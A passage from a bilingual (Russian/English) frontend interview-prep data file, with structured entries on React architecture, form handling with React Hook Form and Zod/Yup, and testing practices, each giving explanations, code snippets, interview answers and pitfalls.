            "Пытаться строить иерархии наследования компонентов (class ConfirmModal extends Modal) там, где композиция решила бы задачу проще.",
            "Злоупотреблять children/render props там, где хватило бы простого булевого пропа — усложняет API компонента без нужды.",
          ],
          practiceTask:
            "Возьмите два похожих компонента с частично общей структурой (например, два разных модальных окна) и объедините их в один через композицию (children/пропсы) вместо копирования кода.",
          resources: {
            docs: [
              { title: "Composition vs Inheritance — React docs", url: "https://legacy.reactjs.org/docs/composition-vs-inheritance.html" },
            ],
            articles: [
              { title: "Container/Presentational Pattern", url: "https://www.patterns.dev/react/presentational-container-pattern" },
            ],
          },
        },
      },
      {
        id: "arch-component-boundaries",
        title: "Component Boundaries & Shared Layer",
        content: {
          title: "Component Boundaries & Shared Layer",
          shortExplanation:
            "Границы компонентов — это осознанное решение, где заканчивается ответственность одного компонента и начинается другого; shared layer — общий код (UI-кит, утилиты, хуки), которым пользуются сразу несколько фич, не принадлежа ни одной из них.",
          detailedExplanation:
            "Плохо проведённая граница обычно выглядит как компонент, который одновременно знает бизнес-логику конкретной фичи и детали переиспользуемого UI — например, кнопка 'Добавить в корзину', которая внутри себя делает API-вызов и содержит вёрстку карточки товара, вместо того чтобы быть универсальной кнопкой, которой передают onClick снаружи. Практическое правило: если код нужен двум и более независимым фичам без изменений — он кандидат в shared layer; если он специфичен для одной фичи — он должен жить внутри неё, даже если технически его можно 'обобщить'. Преждевременное обобщение (вынос в shared того, что используется один раз) — такая же архитектурная ошибка, как и её противоположность (дублирование того, что реально нужно шарить), просто менее заметная сразу — она добавляет лишний уровень непрямого обращения (indirection) без реальной пользы.",
          codeExample:
            "// Плохо: UI-компонент знает бизнес-логику конкретной фичи\nfunction AddToCartButton({ productId }) {\n  const handleClick = () => fetch(`/api/cart/${productId}`, { method: 'POST' });\n  return <button onClick={handleClick}>Add to Cart</button>;\n}\n\n// Хорошо: shared-компонент не знает про 'корзину', фича передаёт поведение снаружи\nfunction Button({ children, onClick }) { return <button onClick={onClick}>{children}</button>; }\nfunction AddToCartButton({ productId }) {\n  const { addToCart } = useCart(); // бизнес-логика — в фиче, не в shared\n  return <Button onClick={() => addToCart(productId)}>Add to Cart</Button>;\n}",
          whereUsed:
            "Дизайн shared-слоя (packages/ui в монорепо, папка shared/ во feature-sliced структуре) актуален в любом проекте среднего и крупного размера, где несколько команд или фич используют одни и те же кнопки, инпуты, модалки, хуки авторизации.",
          interviewQuestion: "Как определить, должен ли конкретный компонент жить в shared-слое или внутри конкретной фичи?",
          interviewAnswerRu:
            "Главный критерий — знает ли компонент о бизнес-логике конкретной фичи. Если компонент содержит только визуальное поведение и принимает данные/колбэки снаружи (как обычная кнопка или модалка), он кандидат в shared. Если он завязан на конкретный домен (знает про 'корзину', 'заказ', конкретный API) — он должен жить внутри фичи, даже если выглядит переиспользуемым технически; вынос такого компонента в shared создаёт скрытую связанность между несвязанными фичами через общий 'домен-специфичный' shared-код.",
          interviewAnswerEn:
            "The main criterion is whether the component knows about a specific feature's business logic. If it only handles visual behavior and takes data/callbacks from outside (like a plain button or modal), it's a shared candidate. If it's tied to a specific domain (knows about 'cart', 'order', a specific API), it belongs inside that feature, even if it looks technically reusable — pulling it into shared creates hidden coupling between unrelated features through domain-specific shared code.",
          pitfalls: [
            "Выносить в shared компонент, использующийся сейчас только в одном месте, 'на будущее' — преждевременное обобщение усложняет код без текущей пользы.",
            "Позволять shared-компоненту постепенно 'обрастать' специфичной для одной фичи логикой через условные пропсы (isCartVariant, showOrderBadge) — это признак того, что граница проведена неверно.",
          ],
        },
      },
      {
        id: "arch-config-driven-ui",
        title: "Config-Driven UI",
        content: {
          title: "Config-Driven UI",
          shortExplanation:
            "Config-driven UI — подход, при котором структура и поведение интерфейса (набор полей формы, колонки таблицы, шаги визарда) описываются декларативным конфигом-данными, а не жёстко захардкожены в JSX каждый раз заново.",
          detailedExplanation:
            "Вместо того чтобы писать отдельный компонент формы для каждой сущности (UserForm, ProductForm, OrderForm) с почти одинаковой структурой (label, инпут, валидация, ошибка), можно описать поля как массив конфигурации ({ name, label, type, validation }) и один универсальный компонент FormRenderer, который проходит по конфигу и рендерит нужные поля. Это особенно ценно, когда конфигурация должна меняться без пересборки фронтенда — например, приходить с бэкенда (админка может добавлять новые поля формы без релиза фронтенда) или зависеть от прав пользователя (разные роли видят разный набор колонок таблицы). Обратная сторона: чрезмерно общий конфиг-движок для UI, который пытается описать вообще любую возможную форму интерфейса через JSON, быстро становится сложнее и менее читаемым, чем было бы просто написать конкретный JSX-компонент для конкретного случая — конфиг-driven UI оправдан там, где реально много похожих, но не идентичных экранов, а не как универсальный принцип по умолчанию.",
          codeExample:
            "const userFormConfig = [\n  { name: 'email', label: 'Email', type: 'email', required: true },\n  { name: 'age', label: 'Age', type: 'number', min: 18 },\n];\n\nfunction ConfigDrivenForm({ config, onSubmit }) {\n  return (\n    <form onSubmit={onSubmit}>\n      {config.map((field) => (\n        <FormField key={field.name} {...field} />\n      ))}\n    </form>\n  );\n}",
          whereUsed:
            "Админ-панели с десятками похожих CRUD-форм и таблиц, конструкторы отчётов, настраиваемые дашборды, формы, чья структура зависит от роли пользователя или приходит с бэкенда.",
          interviewQuestion: "Когда config-driven подход к UI даёт реальную выгоду, а когда становится излишним усложнением?",
          interviewAnswerRu:
            "Выгода реальна, когда в проекте много похожих, но не идентичных экранов (десятки CRUD-форм, таблиц с фильтрами), и конфиг избавляет от копирования почти одинакового JSX раз за разом, а также когда структуру экрана нужно менять динамически (по ролям, с бэкенда) без пересборки фронтенда. Излишним усложнением это становится, когда экран на самом деле один-два в своём роде и вряд ли появятся похожие — тогда написание универсального конфиг-движка обходится дороже, чем просто написать конкретный компонент, а сам конфиг начинает обрастать спецслучаями ('если поле типа X и флаг Y — рендерить иначе'), что убивает изначальную простоту.",
          interviewAnswerEn:
            "The benefit is real when a project has many similar-but-not-identical screens (dozens of CRUD forms, filterable tables), and the config saves you from copy-pasting nearly identical JSX repeatedly, and also when a screen's structure needs to change dynamically (by role, from the backend) without a frontend rebuild. It becomes excessive complexity when there's really only one or two screens of that kind and similar ones are unlikely to appear — building a generic config engine then costs more than just writing the specific component, and the config itself starts accumulating special cases ('if field type X and flag Y, render differently'), which kills the original simplicity.",
          pitfalls: [
            "Строить общий конфиг-движок 'на все случаи жизни' раньше, чем появилось хотя бы 3-4 реально похожих экрана.",
            "Прятать в конфиге сложную условную логику вместо явного кода — конфиг с if/else внутри теряет главное преимущество декларативности.",
          ],
        },
      },
      {
        id: "arch-state-ownership",
        title: "State Ownership",
        content: {
          title: "State Ownership",
          shortExplanation:
            "State ownership — вопрос о том, какой компонент (или слой приложения) отвечает за конкретный кусок состояния: где оно должно 'жить', кто имеет право его менять, и кто просто читает производное от него значение.",
          detailedExplanation:
            "Классическое правило React — 'поднимать состояние вверх' (lifting state up) ровно до того общего предка, которому оно реально нужно для координации нескольких дочерних компонентов, и не выше: состояние, поднятое слишком высоко 'на всякий случай', заставляет ре-рендериться более крупную часть дерева, чем нужно, а состояние, оставленное слишком локально, не даёт другим компонентам, которым оно на самом деле нужно, до него дотянуться без prop drilling. Отдельный вопрос владения — это разница между 'источником истины' (single source of truth) и производными от него значениями: если два компонента показывают пересчитанные версии одного и того же состояния, только один компонент/стор должен реально им владеть, а остальные должны получать производное значение (через селектор или derived state), а не дублировать и синхронизировать копии вручную. В более крупном масштабе (feature-sliced, модульная архитектура) владение распространяется и на уровень фич: конкретная фича должна быть единственным местом, где меняется относящееся к ней состояние, а другие фичи, которым нужны эти данные, должны читать их через публичный интерфейс, а не напрямую лезть во внутренний стор чужой фичи.",
          codeExample:
            "// Плохо: два независимых источника похожего состояния, которые могут разойтись\nfunction Header() { const [cartCount, setCartCount] = useState(0); /* ... */ }\nfunction CartIcon() { const [cartCount, setCartCount] = useState(0); /* ... дублирует, не синхронизировано */ }\n\n// Хорошо: единственный владелец состояния (стор), оба компонента только читают\nfunction Header() { const cartCount = useCartStore((s) => s.items.length); }\nfunction CartIcon() { const cartCount = useCartStore((s) => s.items.length); }",
          whereUsed:
            "Любое приложение среднего размера и выше, где несколько компонентов/фич показывают связанные данные — корзина, авторизация, фильтры, применяемые сразу к нескольким виджетам страницы.",
          interviewQuestion: "Как решить, поднимать ли состояние в общего родителя или вынести его в отдельный стор (Zustand/Redux)?",
          interviewAnswerRu:
            "Если состояние нужно только небольшой, локально расположенной группе компонентов с общим прямым предком, и его не нужно читать где-то далеко в дереве, поднятие состояния (lifting state up) достаточно и проще, чем вводить внешний стор. Если состояние нужно многим несвязанным по дереву компонентам (шапка и корзина товаров на разных уровнях вложенности), либо оно должно переживать размонтирование части дерева, либо к нему нужен доступ из мест, между которыми prop drilling был бы избыточным — тогда его выносят во внешний стор с единственным источником истины, к которому каждый компонент подписывается только на нужный ему срез.",
          interviewAnswerEn:
            "If state is only needed by a small, locally grouped set of components sharing a direct common ancestor, and nothing far away in the tree needs to read it, lifting state up is sufficient and simpler than introducing an external store. If the state is needed by many components unrelated by tree position (a header and a cart badge at different nesting levels), or it must survive part of the tree unmounting, or it needs to be accessed from places where prop drilling would be excessive — then it belongs in an external store with a single source of truth, which each component subscribes to only for the slice it needs.",
          pitfalls: [
            "Дублировать одно и то же состояние в нескольких независимых useState вместо одного владельца — копии неизбежно расходятся со временем.",
            "Поднимать состояние в самый верх дерева 'на всякий случай', хотя оно реально нужно только двум соседним компонентам.",
          ],
        },
      },
      {
        id: "arch-url-state",
        title: "URL State",
        content: {
          title: "URL State",
          shortExplanation:
            "URL state — часть состояния приложения (текущая страница пагинации, применённые фильтры, открытая вкладка, id выбранной записи), которая хранится не в памяти React, а прямо в адресной строке — в пути или query-параметрах.",
          detailedExplanation:
            "Хранение состояния в URL даёт бесплатно то, что сложно воспроизвести через обычный useState: страницу можно обновить (F5) без потери фильтров, ссылку можно скопировать и отправить коллеге с сохранённым состоянием экрана, кнопки 'назад/вперёд' браузера естественно работают как навигация по истории применённых фильтров. В Next.js App Router URL state читается и обновляется через useSearchParams (чтение query-параметров), usePathname (текущий путь) и router.push/replace с новым query — причём push добавляет запись в историю браузера (кнопка 'назад' сработает), а replace заменяет текущую запись без добавления новой (полезно для 'мелких' изменений вроде debounced-поиска, где не нужна отдельная запись истории на каждое нажатие клавиши). Не всё состояние экрана должно быть в URL: временное, не влияющее на 'что показать при обновлении страницы или при шаринге ссылки' состояние (открыт ли конкретный dropdown, наведена ли мышь) следует оставлять в обычном React state, а не засорять им адресную строку.",
          codeExample:
            "'use client';\nimport { useRouter, useSearchParams } from 'next/navigation';\n\nfunction ProductFilters() {\n  const router = useRouter();\n  const searchParams = useSearchParams();\n  const category = searchParams.get('category') ?? 'all';\n\n  function setCategory(value) {\n    const params = new URLSearchParams(searchParams);\n    params.set('category', value);\n    router.push(`?${params.toString()}`); // фильтр теперь переживёт обновление страницы\n  }\n}",
          whereUsed:
            "Страницы со списками и фильтрами (каталоги, таблицы с сортировкой/пагинацией), мультивкладочные экраны, модалки, которые должны открываться напрямую по ссылке (например, /products?modal=share).",
          interviewQuestion: "Какое состояние стоит хранить в URL, а какое — оставлять в обычном React state?",
          interviewAnswerRu:
            "В URL стоит выносить то состояние, которое имеет смысл сохранить при обновлении страницы или передать другому человеку по ссылке: применённые фильтры, номер страницы пагинации, выбранная вкладка, id открытой записи. Обычным React state должно оставаться то, что чисто визуально-временное и не несёт смысла вне текущей сессии взаимодействия — открыт ли конкретный dropdown, наведена ли курсором строка таблицы, промежуточное значение поля до валидации. Смешение этих двух категорий — как избыточное 'засорение' URL мелочами, так и потеря полезного состояния при обновлении страницы — одинаково ухудшает пользовательский опыт.",
          interviewAnswerEn:
            "URL state should hold what's worth preserving across a page refresh or sharing via a link: applied filters, the current pagination page, the selected tab, the id of an open record. Regular React state should hold what's purely visual and transient, carrying no meaning outside the current interaction session — whether a specific dropdown is open, whether a table row is hovered, an in-progress field value before validation. Mixing up the two — either cluttering the URL with trivia or losing useful state on refresh — equally hurts the user experience.",
          pitfalls: [
            "Хранить в URL слишком мелкие детали UI (например, ховер-состояние) — адресная строка становится нечитаемой и меняется на каждое движение мыши.",
            "Не хранить в URL реально важные фильтры/пагинацию — пользователь теряет их при обновлении страницы или не может поделиться ссылкой на нужный вид данных.",
          ],
        },
      },
      {
        id: "arch-trade-offs",
        title: "Architecture Trade-offs",
        content: {
          title: "Architecture Trade-offs",
          shortExplanation:
            "Любое архитектурное решение — это не выбор 'правильного' варианта в вакууме, а обмен одних издержек на другие: строгость против скорости разработки, переиспользуемость против простоты, гибкость против предсказуемости.",
          detailedExplanation:
            "Feature-sliced или модульная архитектура снижает связанность между фичами и упрощает параллельную работу нескольких команд, но добавляет накладные расходы на прослойки (публичные интерфейсы модулей, больше файлов, больше уровней импортов) — для маленького проекта с одним разработчиком это чистые издержки без окупающейся выгоды. Config-driven UI ускоряет добавление новых похожих экранов, но усложняет отладку конкретного случая (логика 'размазана' между конфигом и универсальным рендерером вместо того, чтобы быть в одном явном компоненте). Вынос состояния в глобальный стор упрощает доступ из разных частей дерева, но увеличивает связанность между компонентами, которые теперь неявно зависят от общего состояния, а не только от своих пропсов. Задача старшего инженера — не выучить 'единственно верную' архитектуру, а уметь явно называть, какими издержками конкретное решение оплачивается, и сознательно решать, оправданы ли они масштабом и стадией жизни именно этого проекта прямо сейчас.",
          codeExample:
            "// Пример явного проговаривания trade-off в коде/PR-описании:\n// 'Вынесли фильтры каталога в общий FilterConfig вместо трёх отдельных компонентов.\n//  Плюс: -200 строк дублирования между тремя похожими страницами каталога.\n//  Минус: дебажить конкретный фильтр стало на 1 уровень непрямого обращения сложнее.\n//  Решение оправдано, т.к. таких страниц уже 6 и планируется больше.'",
          whereUsed:
            "Обсуждение архитектурных решений в код-ревью, RFC/ADR-документах, дизайн-сессиях перед стартом крупной фичи или рефакторинга.",
          interviewQuestion: "Приведите пример архитектурного решения и explicitly назовите, чем за него приходится платить.",
          interviewAnswerRu:
            "Например, переход с prop drilling на глобальный стор для состояния корзины: платой становится то, что теперь любой компонент, читающий стор, неявно связан со всем модулем корзины, а не только с конкретными пропсами, которые ему передали явно — это усложняет тестирование в изоляции (нужно замокать стор целиком) и делает менее очевидным, откуда именно приходят данные при первом чтении кода. Выгода — устранение глубокого prop drilling через 5-6 уровней компонентов, которым корзина сама по себе не нужна, они лишь передают её дальше. Решение оправдано, если таких мест использования действительно много; для одного-двух уровней вложенности prop drilling обычно проще и предсказуемее.",
          interviewAnswerEn:
            "For example, moving from prop drilling to a global store for cart state: the cost is that any component reading the store becomes implicitly coupled to the whole cart module, not just to the specific props it was explicitly given — this complicates isolated testing (you need to mock the whole store) and makes it less obvious where data comes from on a first read of the code. The benefit is eliminating deep prop drilling through 5-6 levels of components that don't need the cart themselves, only pass it along. The trade is worth it if there are genuinely many such usage sites; for one or two levels of nesting, prop drilling is usually simpler and more predictable.",
          pitfalls: [
            "Обсуждать архитектурные решения в терминах 'правильно/неправильно' вместо явного перечисления, чем конкретно оплачивается каждый вариант.",
            "Копировать архитектурное решение из другого (обычно более крупного) проекта без учёта, что trade-off, оправданный там, может быть неоправданным издержками для текущего масштаба.",
          ],
        },
      },

    ],
  },


  {
    id: "forms",
    title: "Forms",
    subtopics: [
      {
        id: "forms-rhf-register-vs-controller",
        title: "React Hook Form: register vs Controller",
        content: {
          title: "React Hook Form: register vs Controller",
          shortExplanation:
            "register напрямую подключает нативный DOM-инпут к форме через ref, не вызывая ре-рендер на каждое нажатие клавиши; Controller — переходник для интеграции с controlled-компонентами (кастомный select, date picker), у которых нет обычного DOM value/onChange, к которому можно подключиться через ref.",
          detailedExplanation:
            "register('fieldName') возвращает набор пропсов (ref, onChange, onBlur, name), который подключается напрямую к нативному инпуту — React Hook Form отслеживает значение через ref и нативные события, вообще не вызывая ре-рендер компонента формы на каждое нажатие клавиши, что и даёт основной прирост производительности библиотеки. Проблема возникает с UI-кит компонентами (MUI Select, кастомный DatePicker), которые не принимают ref напрямую или используют собственную внутреннюю модель управления значением, не совместимую с нативным onChange инпута — для них register не подходит. Controller оборачивает такой компонент и предоставляет ему объект field ({ value, onChange, onBlur, ref }) через render-проп, беря на себя интеграцию между внутренней моделью React Hook Form и API стороннего компонента — за счёт этого Controller всё же вызывает ре-рендер обёрнутого компонента при каждом изменении (в отличие от register), потому что это единственный способ синхронизировать value для controlled-компонентов.",
          codeExample:
            "function LoginForm() {\n  const { register, control, handleSubmit } = useForm();\n\n  return (\n    <form onSubmit={handleSubmit(onSubmit)}>\n      <input {...register('email')} /> {/* нативный инпут — через register */}\n\n      <Controller\n        name=\"country\"\n        control={control}\n        render={({ field }) => <CustomSelect {...field} />} {/* сторонний компонент — через Controller */}\n      />\n    </form>\n  );\n}",
          whereUsed:
            "register — для обычных нативных input/textarea/select. Controller — для любых сторонних или самописных компонентов формы (MUI, Ant Design, кастомные date picker/select/rich text editor), которые не являются простыми нативными элементами.",
          interviewQuestion: "Почему Controller вызывает больше ре-рендеров, чем register, и это нормально?",
          interviewAnswerRu:
            "register полагается на прямой доступ к DOM-элементу через ref и подписку на нативные события, поэтому React Hook Form может отслеживать изменение значения, вообще не трогая React state и не вызывая ре-рендер. Controller же оборачивает компонент, у которого нет доступа к нативному DOM-инпуту напрямую (или он не подходит для ref) — единственный способ передать актуальное value в такой компонент — это React state, поэтому Controller использует внутренний useState и, соответственно, вызывает ре-рендер обёрнутого компонента при каждом изменении. Это не недостаток, а необходимая плата за интеграцию с controlled-компонентами, у которых просто нет другого способа получать значение.",
          interviewAnswerEn:
            "register relies on direct DOM access via ref and native event subscriptions, so React Hook Form can track value changes without ever touching React state or triggering a re-render. Controller wraps a component that has no direct native DOM input access (or can't take a ref) — the only way to pass it a current value is through React state, so Controller uses an internal useState and consequently re-renders the wrapped component on every change. This isn't a downside, it's the necessary cost of integrating with controlled components that simply have no other way to receive a value.",
          pitfalls: [
            "Пытаться использовать register напрямую на стороннем controlled-компоненте без поддержки ref — библиотека не сможет корректно отследить значение.",
            "Оборачивать в Controller обычный нативный input там, где хватило бы простого register — это добавляет лишний ре-рендер без необходимости.",
          ],
        },
      },
      {
        id: "forms-validation-zod-yup",
        title: "Валидация форм: Zod / Yup",
        content: {
          title: "Валидация форм: Zod / Yup",
          shortExplanation:
            "Zod и Yup — библиотеки схемной валидации: вместо разрозненных ручных проверок каждого поля правила описываются декларативно в одной схеме, которая одновременно проверяет данные в рантайме и (для Zod) выводит из себя TypeScript-тип.",
          detailedExplanation:
            "Схема описывает форму и ограничения данных декларативно (z.string().email(), z.number().min(18)), и её можно переиспользовать в нескольких местах: для валидации формы на клиенте, для валидации тела запроса на сервере (если бэкенд тоже на Node/TypeScript), и как источник TypeScript-типа через z.infer<typeof schema>, что исключает рассинхронизацию между 'что мы валидируем' и 'какой тип мы ожидаем'. React Hook Form интегрируется со схемными валидаторами через резолверы (zodResolver(schema), yupResolver(schema)) — это позволяет не писать валидацию поля вручную внутри register, а просто передать готовую схему в useForm({ resolver }), и вся валидация будет применяться автоматически при сабмите (и опционально — при изменении/потере фокуса). Zod в целом более 'TypeScript-first' (типы выводятся автоматически из схемы), тогда как Yup исторически шёл из мира JavaScript и требует either отдельного описания типа, either вывода через InferType, что чуть менее прямолинейно.",
          codeExample:
            "import { z } from 'zod';\nimport { zodResolver } from '@hookform/resolvers/zod';\n\nconst loginSchema = z.object({\n  email: z.string().email('Некорректный email'),\n  password: z.string().min(8, 'Минимум 8 символов'),\n});\ntype LoginFormValues = z.infer<typeof loginSchema>; // тип выведен из схемы\n\nconst { register, handleSubmit, formState: { errors } } = useForm<LoginFormValues>({\n  resolver: zodResolver(loginSchema),\n});",
          whereUsed:
            "Любые формы с нетривиальной валидацией (регистрация, оформление заказа, настройки профиля), особенно там, где важно синхронизировать валидацию на клиенте с контрактом API и типами TypeScript.",
          interviewQuestion: "Какое преимущество даёт схемная валидация (Zod/Yup) по сравнению с ручными правилами внутри register?",
          interviewAnswerRu:
            "Ручные правила валидации, разбросанные по отдельным register('field', { required: ..., pattern: ... }) для каждого поля, сложно переиспользовать в другом месте (например, для валидации того же набора данных на сервере) и легко рассинхронизировать с реальными требованиями по мере роста формы. Схема в Zod/Yup описывает все правила централизованно в одном месте, может быть переиспользована и на клиенте, и на сервере, а для Zod дополнительно автоматически даёт точный TypeScript-тип данных формы — вместо того чтобы вручную поддерживать типы и правила валидации отдельно и рисковать их рассинхронизацией.",
          interviewAnswerEn:
            "Manual validation rules scattered across separate register('field', { required: ..., pattern: ... }) calls for each field are hard to reuse elsewhere (say, to validate the same data shape on the server) and easily drift out of sync with actual requirements as the form grows. A Zod/Yup schema describes all the rules centrally in one place, can be reused on both client and server, and for Zod additionally gives you the form data's exact TypeScript type automatically — instead of manually maintaining types and validation rules separately and risking them falling out of sync.",
          pitfalls: [
            "Дублировать правила валидации отдельно на клиенте и на сервере вместо переиспользования одной и той же схемы (там, где стек это позволяет).",
            "Делать схему валидации избыточно строгой для промежуточных состояний формы (например, требовать заполненности поля до того, как пользователь вообще успел его тронуть).",
          ],
        },
      },
      {
        id: "forms-large-form-optimization",
        title: "Оптимизация больших форм",
        content: {
          title: "Оптимизация больших форм",
          shortExplanation:
            "Большая форма (десятки полей, динамические секции, вложенные массивы) требует отдельного внимания к производительности: неправильная архитектура заставляет всю форму перерендериваться на каждое нажатие клавиши в любом поле.",
          detailedExplanation:
            "Uncontrolled-подход (register в React Hook Form) — первый и самый важный шаг: он в принципе не вызывает ре-рендер формы на ввод, в отличие от controlled-инпутов с useState на каждое поле, где любое изменение одного поля перерендеривает компонент, содержащий все остальные поля формы. Для динамических списков полей (телефоны, адреса доставки) используют useFieldArray, который эффективно управляет массивом полей без пересоздания всех строк при добавлении/удалении одной. Для отображения ошибки или значения только одного конкретного поля вместо реакции всего компонента формы на любое изменение используют useWatch с конкретным именем поля или компонент subscription-паттерна, который подписывается точечно, а не читает весь formState целиком через хук верхнего уровня. Наконец, тяжёлые вычисления, зависящие от значений формы (сложная кросс-валидация нескольких полей, подсчёт итоговой суммы), стоит мемоизировать и по возможности дебаунсить, если они недёшевы и не обязаны пересчитываться на каждое нажатие клавиши.",
          codeExample:
            "// useFieldArray — эффективная работа с динамическим списком полей\nconst { fields, append, remove } = useFieldArray({ control, name: 'phones' });\n\n{fields.map((field, index) => (\n  <input key={field.id} {...register(`phones.${index}.number`)} />\n))}\n\n// useWatch — точечная подписка на одно поле вместо всего formState\nconst email = useWatch({ control, name: 'email' });",
          whereUsed:
            "Многошаговые формы онбординга, формы оформления заказа с динамическими позициями, административные формы с десятками настроек, формы с кросс-валидацией нескольких зависимых полей.",
          interviewQuestion: "Почему controlled-подход (useState на каждое поле) плохо масштабируется на форму с 50+ полями?",
          interviewAnswerRu:
            "Если каждое поле хранится в собственном useState компонента формы, любое нажатие клавиши в любом одном поле вызывает setState и, соответственно, ре-рендер всего компонента формы целиком, включая JSX всех остальных 49 полей — даже если их значения не изменились. При росте числа полей это становится всё заметнее пользователю как задержка ввода, особенно если в форме есть тяжёлые дочерние компоненты (сложные select, richtext-редакторы). Uncontrolled-подход и точечные подписки (useWatch на конкретное поле, а не на всю форму) решают это, ограничивая ре-рендер ровно тем, что реально должно обновиться.",
          interviewAnswerEn:
            "If every field lives in its own useState on the form component, a keystroke in any single field triggers setState and thus a re-render of the entire form component, including the JSX of all other 49 fields — even though their values haven't changed. As field count grows, this becomes increasingly noticeable to the user as input lag, especially if the form has heavy child components (complex selects, rich-text editors). An uncontrolled approach and targeted subscriptions (useWatch on a specific field rather than the whole form) fix this by limiting re-renders to exactly what actually needs to update.",
          pitfalls: [
            "Использовать один общий useState-объект для всей формы с полностью controlled-инпутами на 50+ полей.",
            "Подписываться на весь formState целиком верхнеуровневым хуком там, где нужно значение только одного конкретного поля.",
          ],
        },
      },
    ],
  },

  {
    id: "testing",
    title: "Testing",
    subtopics: [
      {
        id: "testing-pyramid",
        title: "Testing Pyramid",
        content: {
          title: "Testing Pyramid (Unit / Integration / E2E)",
          shortExplanation:
            "Пирамида тестирования описывает рекомендуемое соотношение разных видов тестов: много быстрых unit-тестов внизу, меньше integration-тестов посередине, ещё меньше медленных e2e-тестов сверху.",
          detailedExplanation:
            "Unit-тесты проверяют одну маленькую единицу кода (функцию, хук) в изоляции — они самые быстрые и дешёвые, но не гарантируют, что части системы правильно работают вместе. Integration-тесты проверяют взаимодействие нескольких единиц (например, компонент + хук + стор) — медленнее, но ближе к реальному использованию. E2E-тесты (Cypress, Playwright) проверяют весь путь пользователя в реальном (или похожем на реальный) браузере — самые медленные и хрупкие, но дают наибольшую уверенность, что фича действительно работает. 'Пирамида' — это совет не переворачивать это соотношение: не пытаться покрыть всё только e2e-тестами.",
          codeExample:
            "// Unit-тест: изолированная функция\ntest('sum adds two numbers', () => {\n  expect(sum(2, 3)).toBe(5);\n});\n\n// Integration-тест: компонент + взаимодействие пользователя\ntest('form shows error on invalid email', async () => {\n  render(<LoginForm />);\n  await userEvent.type(screen.getByLabelText('Email'), 'not-an-email');\n  await userEvent.click(screen.getByRole('button', { name: /submit/i }));\n  expect(await screen.findByText(/invalid email/i)).toBeInTheDocument();\n});",
          interviewQuestion: "Почему не стоит покрывать всё приложение только e2e-тестами?",
          interviewAnswerRu:
            "E2E-тесты запускают весь стек — реальный (или почти реальный) браузер, сеть, иногда бэкенд — поэтому они на порядки медленнее unit-тестов и более хрупкие (падают из-за таймингов, изменений вёрстки, нестабильной сети), что усложняет их поддержку. Если полагаться только на них, обратная связь при разработке становится очень медленной, а флейки (нестабильно падающие тесты) снижают доверие ко всей тестовой базе. Основную логику дешевле и надёжнее проверять unit- и integration-тестами, оставляя e2e для нескольких критичных пользовательских сценариев.",
          interviewAnswerEn:
            "E2E tests run the whole stack — a real (or near-real) browser, network, sometimes a backend — so they're orders of magnitude slower than unit tests and more fragile (failing due to timing, layout changes, flaky networking), which makes them expensive to maintain. Relying on them alone makes development feedback very slow, and flaky tests erode trust in the whole test suite. Core logic is cheaper and more reliably covered with unit and integration tests, leaving e2e for a handful of critical user journeys.",
          pitfalls: [
            "Писать unit-тесты, которые дублируют реализацию 1-в-1 (проверяют детали внутренностей, а не поведение) — ломаются при любом рефакторинге.",
            "Не иметь ни одного e2e-теста на критичный путь (например, оформление заказа) — баг может пройти все unit-тесты и всё равно сломать продакшн.",
          ],
          practiceTask:
            "Возьмите одну фичу своего приложения и распишите, какие тесты для неё были бы unit, какие — integration, а какие оправданно оставить только на e2e-уровне.",
          resources: {
            docs: [
              { title: "Test Pyramid — Martin Fowler", url: "https://martinfowler.com/bliki/TestPyramid.html" },
            ],
            articles: [
              { title: "Write tests. Not too many. Mostly integration.", url: "https://kentcdodds.com/blog/write-tests" },
            ],
          },
        },
      },
      {
        id: "testing-rtl",
        title: "React Testing Library",
        content: {
          title: "React Testing Library",
          shortExplanation:
            "React Testing Library (RTL) — библиотека для тестирования React-компонентов, построенная на принципе 'тестируй так, как компонентом пользуется реальный человек'.",
          detailedExplanation:
            "В отличие от Enzyme (который позволял проверять внутреннее состояние и структуру компонента), RTL намеренно не даёт лёгкого доступа к деталям реализации: элементы ищутся по тому, что видит и слышит пользователь — тексту, роли (role), aria-атрибутам, а не по CSS-классам или именам внутренних методов. Это делает тесты устойчивыми к рефакторингу внутренней реализации компонента (смена useState на useReducer не должна ломать тесты, если поведение снаружи не изменилось) и заставляет писать более доступный (accessible) UI, потому что тесты используют те же способы поиска элементов, что и screen reader.",
          codeExample:
            "import { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\n\ntest('increments counter on click', async () => {\n  render(<Counter />);\n  const button = screen.getByRole('button', { name: /increment/i });\n  await userEvent.click(button);\n  expect(screen.getByText('Count: 1')).toBeInTheDocument();\n});",
          interviewQuestion: "Почему RTL советует искать элементы по role/тексту, а не по data-testid или CSS-классу?",
          interviewAnswerRu:
            "Поиск по роли и тексту проверяет то же, что видит и использует реальный пользователь (в том числе пользователь скринридера), поэтому такой тест одновременно служит проверкой доступности интерфейса. CSS-классы и внутренние testid — это детали реализации, не видимые пользователю: их можно менять при рефакторинге вёрстки, и хороший тест не должен на них ломаться. data-testid остаётся как 'запасной вариант', когда элемент нельзя однозначно найти доступным способом, а не как основной инструмент поиска.",
          interviewAnswerEn:
            "Querying by role and text checks exactly what a real user (including a screen-reader user) sees and interacts with, so such a test doubles as an accessibility check. CSS classes and internal test ids are implementation details invisible to the user: they can change during a markup refactor, and a good test shouldn't break because of that. data-testid remains a fallback for when an element genuinely can't be found in an accessible way, not the primary search tool.",
          pitfalls: [
            "Использовать getByTestId как основной способ поиска элементов вместо getByRole/getByLabelText — тест перестаёт проверять доступность.",
            "Тестировать внутреннее состояние компонента напрямую вместо проверки того, что видно и доступно пользователю на экране.",
          ],
          practiceTask:
            "Напишите тест для формы логина, который находит поля через getByLabelText, кнопку — через getByRole, и проверяет появление сообщения об ошибке через findByText.",
          resources: {
            docs: [
              { title: "Testing Library — Guiding Principles", url: "https://testing-library.com/docs/guiding-principles/" },
            ],
            articles: [
              { title: "Common mistakes with React Testing Library", url: "https://kentcdodds.com/blog/common-mistakes-with-react-testing-library" },
            ],
          },
        },
      },
      {
        id: "testing-mocks",
        title: "Mocking & Stubs",
        content: {
          title: "Mocking & Stubs",
          shortExplanation:
            "Моки и стабы — это 'подставные' версии реальных зависимостей (API, модулей, таймеров), которые используются в тестах, чтобы изолировать тестируемый код от внешнего мира.",
          detailedExplanation:
